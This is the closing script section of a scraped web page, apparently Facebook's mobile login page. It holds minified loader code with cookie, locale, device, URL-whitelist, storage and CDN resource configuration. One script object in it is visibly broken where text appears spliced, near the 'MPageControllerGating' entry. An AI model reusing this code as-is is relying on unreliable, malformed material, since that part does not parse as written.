      <script nonce>requireLazy(["__bigPipe"],(function(bigPipe){bigPipe.onPageletArrive({displayResources:["kCifscA","MoYpVB9","pvPg6+u","Uym/i4J","OxtYXyY","Dn5kds1","bPqmNkA","2k5Zrzs","4b3frHc","QELA+YR","FJqL2Al"],id:"first_response",phase:0,last_in_phase:true,tti_phase:0,all_phases:[63],jsmods:{define:[["CookieDomain",[],{domain:"facebook.com"},6421],["IntlVariationHoldout",[],{disable_variation:false},6533],["CookieCoreConfig",[],{c_user:{s:"None"},cppo:{t:86400,s:"None"},dpr:{t:604800,s:"None"},fbl_ci:{t:31536000,s:"None"},fbl_cs:{t:31536000,s:"None"},fbl_st:{t:31536000,s:"Strict"},i_user:{s:"None"},locale:{t:604800,s:"None"},m_ls:{t:158284800,s:"None"},m_pixel_ratio:{t:604800,s:"None"},noscript:{s:"None"},presence:{t:2592000,s:"None"},sfau:{s:"None"},usida:{s:"None"},vpd:{t:5184000,s:"Lax"},wd:{t:604800,s:"Lax"},"x-referer":{s:"None"},"x-src":{t:1,s:"None"}},2104],["FbtQTOverrides",[],{overrides:{}},551],["FbtResultGK",[],{shouldReturnFbtResult:true,inlineMode:"NO_INLINE"},876],["IntlPhonologicalRules",[],{meta:{"/_B/":"([.,!?\\s]|^)","/_E/":"([.,!?\\s]|$)"},patterns:{"/\u0001(.*)('|')s\u0001(?:'|')s(.*)/":"\u0001$1$2s\u0001$3","/_\u0001([^\u0001]*)\u0001/":"javascript"}},1496],["IntlViewerContext",[],{GENDER:3,regionalLocale:null},772],["MJSEnvironment",[],{IS_APPLE_WEBKIT_IOS:false,IS_TABLET:false,IS_ANDROID:true,IS_CHROME:true,IS_FIREFOX:false,IS_WINDOWS_PHONE:false,IS_SAMSUNG_DEVICE:false,OS_VERSION:10,PIXEL_RATIO:1,BROWSER_NAME:"Chrome Mobile"},46],["MLoadingIndicatorSigils",[],{ANIMATE:"m-loading-indicator-animate",ROOT:"m-loading-indicator-root"},279],["NumberFormatConfig",[],{decimalSeparator:".",numberDelimiter:",",minDigitsForThousandsSeparator:4,standardDecimalPatternInfo:{primaryGroupSize:3,secondaryGroupSize:3},numberingSystemData:null},54],["UserAgentData",[],{browserArchitecture:"32",browserFullVersion:"81.0.4044.96",browserMinorVersion:0,browserName:"Chrome",browserVersion:81,deviceName:"Unknown",engineName:"WebKit",engineVersion:"537.36",platformArchitecture:"32",platformName:"Android",platformVersion:"10",platformFullVersion:"10"},527],["ZeroCategoryHeader",[],{},1127],["ZeroRewriteRules",[],{rewrite_rules:{},whitelist:{"/hr/r":1,"/hr/p":1,"/zero/unsupported_browser/":1,"/zero/policy/optin":1,"/zero/optin/write/":1,"/zero/optin/legal/":1,"/zero/optin/free/":1,"/about/privacy/":1,"/about/privacy/update/":1,"/privacy/explanation/":1,"/zero/toggle/welcome/":1,"/zero/toggle/nux/":1,"/zero/toggle/settings/":1,"/fup/interstitial/":1,"/work/landing":1,"/work/login/":1,"/work/email/":1,"/ai.php":1,"/js_dialog_resources/dialog_descriptions_android.json":0,"/connect/jsdialog/MPlatformAppInvitesJSDialog/":0,"/connect/jsdialog/MPlatformOAuthShimJSDialog/":0,"/connect/jsdialog/MPlatformLikeJSDialog/":0,"/qp/interstitial/":1,"/qp/action/redirect/":1,"/qp/action/close/":1,"/zero/support/ineligible/":1,"/zero_balance_redirect/":1,"/zero_balance_redirect":1,"/zero_balance_redirect/l/":1,"/l.php":1,"/lsr.php":1,"/ajax/dtsg/":1,"/checkpoint/block/":1,"/exitdsite":1,"/zero/balance/pixel/":1,"/zero/balance/":1,"/zero/balance/carrier_landing/":1,"/zero/flex/logging/":1,"/tr":1,"/tr/":1,"/sem_campaigns/sem_pixel_test/":1,"/bookmarks/flyout/body/":1,"/zero/subno/":1,"/confirmemail.php":1,"/policies/":1,"/mobile/internetdotorg/classifier/":1,"/zero/dogfooding":1,"/xti.php":1,"/zero/fblite/config/":1,"/hr/zsh/wc/":1,"/ajax/bootloader-endpoint/":1,"/mobile/zero/carrier_page/":1,"/mobile/zero/carrier_page/education_page/":1,"/mobile/zero/carrier_page/feature_switch/":1,"/mobile/zero/carrier_page/settings_page/":1,"/aloha_check_build":1,"/upsell/zbd/softnudge/":1,"/mobile/zero/af_transition/":1,"/mobile/zero/af_transition/action/":1,"/mobile/zero/freemium/":1,"/mobile/zero/freemium/redirect/":1,"/mobile/zero/freemium/zero_fup/":1,"/privacy/policy/":1,"/privacy/center/":1,"/data/manifest/":1,"/4oh4.php":1,"/autologin.php":1,"/birthday_help.php":1,"/checkpoint/":1,"/contact-importer/":1,"/cr.php":1,"/legal/terms/":1,"/login.php":1,"/login/":1,"/mobile/account/":1,"/n/":1,"/remote_test_device/":1,"/upsell/buy/":1,"/upsell/buyconfirm/":1,"/upsell/buyresult/":1,"/upsell/promos/":1,"/upsell/continue/":1,"/upsell/h/promos/":1,"/upsell/loan/learnmore/":1,"/upsell/purchase/":1,"/upsell/promos/upgrade/":1,"/upsell/buy_redirect/":1,"/upsell/loan/buyconfirm/":1,"/upsell/loan/buy/":1,"/upsell/sms/":1,"/wap/a/channel/reconnect.php":1,"/wap/a/nux/wizard/nav.php":1,"/wap/appreg.php":1,"/wap/birthday_help.php":1,"/wap/c.php":1,"/wap/confirmemail.php":1,"/wap/cr.php":1,"/wap/login.php":1,"/wap/r.php":1,"/zero/datapolicy":1,"/a/timezone.php":1,"/a/bz":1,"/bz/reliability":1,"/r.php":1,"/mr/":1,"/reg/":1,"/registration/log/":1,"/terms/":1,"/f123/":1,"/expert/":1,"/experts/":1,"/terms/index.php":1,"/terms.php":1,"/srr/":1,"/msite/redirect/":1,"/fbs/pixel/":1,"/contactpoint/preconfirmation/":1,"/contactpoint/cliff/":1,"/contactpoint/confirm/submit/":1,"/contactpoint/confirmed/":1,"/contactpoint/login/":1,"/preconfirmation/contactpoint_change/":1,"/help/contact/":1,"/survey/":1,"/upsell/loyaltytopup/accept/":1,"/settings/":1,"/lite/":1,"/zero_status_update/":1,"/operator_store/":1,"/upsell/":1,"/wifiauth/login/":1}},1478],["CookieCoreLoggingConfig",[],{maximumIgnorableStallMs:16.67,sampleRate:9.7e-5,sampleRateClassic:1.0e-10,sampleRateFastStale:1.0e-8},3401],["IntlNumberTypeConfig",[],{impl:"if (n === 1) { return IntlVariations.NUMBER_ONE; } else { return IntlVariations.NUMBER_OTHER; }"},3405],["ServerTimeData",[],{serverTime:1676064976360,timeOfRequestStart:1676064976254.9,timeOfResponseStart:1676064976254.9},5943],["MobileAppDetect",[],{is_mobile_app:false,is_ads_manager_app:false,is_pages_manager:false,is_facebook_for_android:false,is_facebook_for_android_in_app_browser:false,is_android_faceweb:false,is_facebook_for_ios:false,is_instagram:false,is_messenger_for_android:false,is_messenger_for_ios:false,is_messenger_lite_for_android:false,is_messenger_lite_for_ios:false,is_wilde:false,is_kaios:false,is_whatsapp_smb:false,is_whatsapp_smb_for_android:false,is_whatsapp_smb_for_ios:false},1109],["MWebStorageMonsterWhiteList",[],{whitelist:["^CacheStorageVersion$","^RTC_VIDEO_INPUT$","^RTC_AUDIO_INPUT$","^RTC_AUDIO_OUTPUT$","^RTC_IS_AUDIO_ONLY$","^RTC_NOISE_SUPPRESSION$","^RTC_MUTE_STATE$","^Session$","^_oz_","^_video_bandwidthEstimate$","^Banzai$","^bz","^banzai\\:last_storage_flush$","^falco_queue_","^mutex","^msys","^Bandicoot\\:","^imp_seq_num$","^qe_switcher_nub_selection$","^TabId$","^sp_pi$","^\\:userchooser\\:osessusers$","^\\:userchooser\\:settings$","^brands\\:console\\:config$","^consoleEnabled$","^__fb_messenger_desktop_presence_info$","^vc_","^_showMDevConsole$","^ga_client_id$","^_mswam_$","^am_recently_used_filters\\:","^am_image_size_cache$","^ickt$","^hb_timestamp$","^signal_flush_timestamp$","^__MWCMAutoJoinNotifNuxBanner\\.showBanner__$","^last_fast_refresh$","^_ctv_access_token$","^_ctv_android_device_info$","^_ctv_cast_access_token$","^_ctv_casting_remote$","^_ctv_console_log_viewer_on_full_screen_player_enabled$","^_ctv_cookie_consent_displayed$","^_ctv_debug_redux_logger_enabled$","^_ctv_deviceUniqueIDFallback$","^_ctv_gaming_consent_displayed$","^_ctv_installed_app_player_debug_overlay_enabled$","^_ctv_last_load_time_ms$","^_ctv_locale$","^_ctv_logged_out_constraints_sessions_count$","^_ctv_reloadedDueToStaleApp$","^_ctv_reloadedDueToUnrecoverableError$","^_ctv_search_terms$","^_ctv_tv_experiments$","^_ctv_usedCloseAppFallback$","^_ctv_user_sessions$","^_ctv_video_debug_overlay_enabled$","^_ctv_debug_rampart_server_number$","^fx_did$","^wa_lang_banner_dismissed$","^bulletin_article_reader_onload_dialog_seen$","^bulletin_session_attributes$","^md_survey$","^support_guest_chat$","^comet_is_recent_profile_switch$","^comet_console_position$","^mw_exchange_vm$","^has_seen_email_login_toast$","^cs_chat_support_user$","^NFT_DEVICE_KEY_PRIVATE_V1$","^NFT_DEVICE_KEY_PUBLIC_V1$","^show_wa_auth_button$","^BusinessInbox\\:sortMethod$","^Routing\\:url\\:AdsTALRouting$"]},254],["MemoryLoggerConfigWebSitevarConfig",[],{measurement_interval_minutes:5},5573],["FWLoader",[],{},278],["ImmediateActiveSecondsConfig",[],{sampling_rate:0},423],["MPageControllerGating",[],{shouldDeferUntilCertainNoRedirect:false,shouldReleaseFetcherLock:false,{r:null}},qplData:{"891":{r:1}}},hblp:{consistency:{rev:1006944047},rsrcMap:{VvVFw8n:{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3/yn/r/AWepvf-vdZG.js?_nc_x=Ij3Wp8lg5Kz"},"pvPg6+u":{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/UWW6y1Ro_4k.js?_nc_x=Ij3Wp8lg5Kz"},OxtYXyY:{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3/yH/r/Ri9uQBVEGyt.js?_nc_x=Ij3Wp8lg5Kz"},"+4Ej7yu":{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/EHn7j0xFGZz.js?_nc_x=Ij3Wp8lg5Kz"},"Uym/i4J":{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/TGI98QfhHxu.js?_nc_x=Ij3Wp8lg5Kz"},PHSDjJd:{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3/yG/r/Ffyia97TNer.js?_nc_x=Ij3Wp8lg5Kz"},JiZiXFh:{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3izbB4/ya/l/en_US/FtccUWMvQ3o.js?_nc_x=Ij3Wp8lg5Kz"},FZnjsym:{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3/yC/r/HrbizS6oywJ.js?_nc_x=Ij3Wp8lg5Kz"},cck88sN:{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3/y-/r/h8PoFBE575H.js?_nc_x=Ij3Wp8lg5Kz"},FJqL2Al:{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3/yi/r/ohs53z_4AL7.js?_nc_x=Ij3Wp8lg5Kz"},bPqmNkA:{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3/yN/r/MGXRUAcXehC.js?_nc_x=Ij3Wp8lg5Kz"},"QELA+YR":{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3/yi/r/SEiVEe7Izh6.js?_nc_x=Ij3Wp8lg5Kz"},"Z+vKg0k":{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3/y_/r/KKlvRURRLk8.js?_nc_x=Ij3Wp8lg5Kz"},ZvzyYB6:{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3ih-D4/y9/l/en_US/jGbNZXNIjgC.js?_nc_x=Ij3Wp8lg5Kz"},"/rO0lbn":{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3/yf/r/LgvwffuKmeX.js?_nc_x=Ij3Wp8lg5Kz"},"7Jn3h1C":{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3iLQG4/ya/l/en_US/j7muv0BnbMT.js?_nc_x=Ij3Wp8lg5Kz"},dRvaJiX:{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3/yn/r/lNCIXQG6fuL.js?_nc_x=Ij3Wp8lg5Kz"},meyZXh3:{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3/yC/r/5GcuT_fWLBr.js?_nc_x=Ij3Wp8lg5Kz"},LAFYkqj:{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/yjpBV7zqd8r.js?_nc_x=Ij3Wp8lg5Kz"},iqaNd7v:{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/0sm6BuV2M9-.js?_nc_x=Ij3Wp8lg5Kz"},"ogP+H17":{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3ijfq4/yY/l/en_US/s1IB43qwRyx.js?_nc_x=Ij3Wp8lg5Kz"},"ZD+S2f8":{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/ie38mp0O07P.js?_nc_x=Ij3Wp8lg5Kz"}},compMap:{QPLInspector:{r:["VvVFw8n"],be:1},ODS:{r:["pvPg6+u","OxtYXyY"],be:1},TransportSelectingClientSingleton:{r:["+4Ej7yu"],rds:{m:["ContextualConfig","BladeRunnerClient","DGWRequestStreamClient","MqttLongPollingRunner","BanzaiScuba_DEPRECATED","FbtLogging","IntlQtEventFalcoEvent"],r:["pvPg6+u","Dn5kds1","Uym/i4J","OxtYXyY","PHSDjJd","JiZiXFh","FZnjsym","cck88sN","FJqL2Al","bPqmNkA"]},be:1},RequestStreamCommonRequestStreamCommonTypes:{r:["+4Ej7yu"],be:1},Cookie:{r:["pvPg6+u"],rds:{m:["BanzaiScuba_DEPRECATED"],r:["OxtYXyY","Dn5kds1"]},be:1},WebSpeedInteractionsTypedLogger:{r:["pvPg6+u","OxtYXyY","iqaNd7v","FJqL2Al","Uym/i4J","bPqmNkA"],rds:{m:["FbtLogging","IntlQtEventFalcoEvent","BanzaiScuba_DEPRECATED"],r:["Dn5kds1"]},be:1},PerfXSharedFields:{r:["Dn5kds1"],be:1}}}},allResources:["kCifscA","MoYpVB9","pvPg6+u","Uym/i4J","OxtYXyY","Dn5kds1","bPqmNkA","2k5Zrzs","4b3frHc","QELA+YR","Z+vKg0k","ZvzyYB6","JiZiXFh","/rO0lbn","7Jn3h1C","dRvaJiX","meyZXh3","LAFYkqj","FJqL2Al","ogP+H17","ZD+S2f8"]});}));</script>
      <script>requireLazy(["__bigPipe"],function(bigPipe){bigPipe.setPageID("7198644258619037058")});</script><script nonce>(function(){var n=now_inl();requireLazy(["__bigPipe"],function(bigPipe){bigPipe.beforePageletArrive("last_response",n);})})();</script>
      <script nonce>requireLazy(["__bigPipe"],(function(bigPipe){bigPipe.onPageletArrive({id:"last_response",phase:63,last_in_phase:true,the_end:true,jsmods:{define:[["IntlCurrentLocale",[],{code:"en_US"},5954],["MLoginTopDomainsConfig",[],{topEmailDomains:["gmail.com","hotmail.com","outlook.com","yahoo.com","live.nl"]},6972],["USIDMetadata",[],{browser_id:"?",tab_id:"",page_id:"Prpvw0g1sp9bpj",transition_id:0,version:6},5888],["BrowserPaymentHandlerConfig",[],{enabled:false},3904],["BrowserPushPubKey",[],{appServerKey:"BIBn3E_rWTci8Xn6P9Xj3btShT85Wdtne0LtwNUyRQ5XjFNkuTq9j4MPAVLvAFhXrUU1A9UxyxBA7YIOjqDIDHI"},4806],["MTouchableSyntheticClickGK",[],{USE_SYNTHETIC_CLICK:true},368],["cr:686",[],{__rc:[null,"Aa3sU6sCOc7wNWpWR4uVm68fQT9pV4zKbVjNMNV27A1sKDzaVEwXHfB5WwjT9Da_dO69Ef4FzZ4WxbLmxPRCk_Delw"]},-1],["cr:1069930",[],{__rc:[null,"Aa3Hsxv5dzqTDgz7HFBFkVpOcyg_UOVitrgjsAywTDq91rnHA7-0gVKuf6Zzd4DC-zb7zDsclobcmZ4aMh3GEGxooBg"]},-1],["cr:1083116",["XAsyncRequest"],{__rc:["XAsyncRequest","Aa3Hsxv5dzqTDgz7HFBFkVpOcyg_UOVitrgjsAywTDq91rnHA7-0gVKuf6Zzd4DC-zb7zDsclobcmZ4aMh3GEGxooBg"]},-1],["cr:1083117",[],{__rc:[null,"Aa3Hsxv5dzqTDgz7HFBFkVpOcyg_UOVitrgjsAywTDq91rnHA7-0gVKuf6Zzd4DC-zb7zDsclobcmZ4aMh3GEGxooBg"]},-1],["cr:1984081",[],{__rc:[null,"Aa3C3_Wok36FE93xbFOns_vhaTYsxYpzgJl6cYIuq4Tu_0r_epTxq2CUD85aSXaP5KEx44OqzQDiWR4_ARlE_nXOSipd"]},-1],["cr:334",["ghlTestUBTFacebook"],{__rc:["ghlTestUBTFacebook","Aa250X2fkWJG91p0YrUMU4hGy6Ow7zlcx-UJTqWmtoiJVC-s28FUrgFcSYVDWkl8d15JyTqsgWqU2Sf_u5x6I1niMw"]},-1],["cr:1088657",[],{__rc:[null,"Aa1Dl2yVzR5jS6MaDjLVe4EkflJkvFUF5FY_TndrurtCAA9v5ElaxozBR9b5C1nj2Rlkv9UQZ0bUOoJ67voeCuA"]},-1],["cr:1543261",[],{__rc:[null,"Aa1Nd3XMLk44c3imGSSeDd2YVbiWBi1F_gNVLT4YjtwEGPvZEU2IpPZixGEUHs-wz5iCPIC3MF13XUv4YNcXcrBi"]},-1],["cr:708886",["EventProfilerImpl"],{__rc:["EventProfilerImpl","Aa3Hsxv5dzqTDgz7HFBFkVpOcyg_UOVitrgjsAywTDq91rnHA7-0gVKuf6Zzd4DC-zb7zDsclobcmZ4aMh3GEGxooBg"]},-1],["cr:1094907",[],{__rc:[null,"Aa19MoFCzkTO-5VHtYxhabSZbxzyra4CvwzpMvkGzeGa2V-0RTe6MwliMFuWuJpxFQkLpPSClfN-TrQIfoMBSZ8"]},-1],["GhlTennisKnobsConfig",[],{ghlbox_log_validity_in_mins:7200,ghlbox_initialize_in_mins:14400,change_class_interval_in_mins:1440},6687],["EventConfig",[],{sampling:{bandwidth:0,play:0,playing:0,progress:0,pause:0,ended:0,seeked:0,seeking:0,waiting:0,loadedmetadata:0,canplay:0,selectionchange:0,change:0,timeupdate:0,adaptation:0,focus:0,blur:0,load:0,error:0,message:0,abort:0,storage:0,scroll:200000,mousemove:20000,mouseover:10000,mouseout:10000,mousewheel:1,MSPointerMove:10000,keydown:0.1,click:0.02,mouseup:0.02,__100ms:0.001,__default:5000,__min:100,__interactionDefault:200,__eventDefault:100000},page_sampling_boost:1,interaction_regexes:{},interaction_boost:{},event_types:{},manual_instrumentation:false,profile_eager_execution:false,disable_heuristic:true,disable_event_profiler:false},1726]],require:[["BDClientSignalCollectionTrigger","startSignalCollection",[],[{sc:"{\"t\":1659080345,\"c\":[[30000,838801],[30001,838801],[30002,838801],[30003,838801],[30004,838801],[30005,838801],[30006,573585],[30007,838801],[30008,838801],[30012,838801],[30013,838801],[30015,806033],[30018,806033],[30021,540823],[30022,540817],[30040,806033],[30093,806033],[30094,806033],[30095,806033],[30101,541591],[30102,541591],[30103,541591],[30104,541591],[30106,806039],[30107,806039],[38000,541427],[38001,806643]]}",fds:60,fda:60,i:60,sbs:1,dbs:100,bbs:100,hbi:60,rt:262144,hbcbc:2,hbvbc:0,hbbi:30,sid:-1,hbv:"1425596088359585475"}]],["NavigationMetrics","setPage",[],[{page:"XLoginController",page_type:"normal",page_uri:"https://m.facebook.com/login/?refsrc=deprecated&_rdr",serverLID:"7198644258619037058"}]],["ServiceWorkerURLCleaner","removeRedirectID",[],[]]]},hsrp:{hsdp:{clpData:{"1743095":{r:1,s:1}},gkxData:{"1652843":{result:false,hash:"AT6uh9NWRY4QEQoYLTg"}}},hblp:{consistency:{rev:1006944047},rsrcMap:{O7kNNP8:{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3/yY/r/ue_OWlkLDZP.js?_nc_x=Ij3Wp8lg5Kz"},zPYlTyl:{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/_tJ17sGyxOX.js?_nc_x=Ij3Wp8lg5Kz"}}}},allResources:["O7kNNP8","pvPg6+u","OxtYXyY","zPYlTyl"]});}));</script>
   </body>
</html>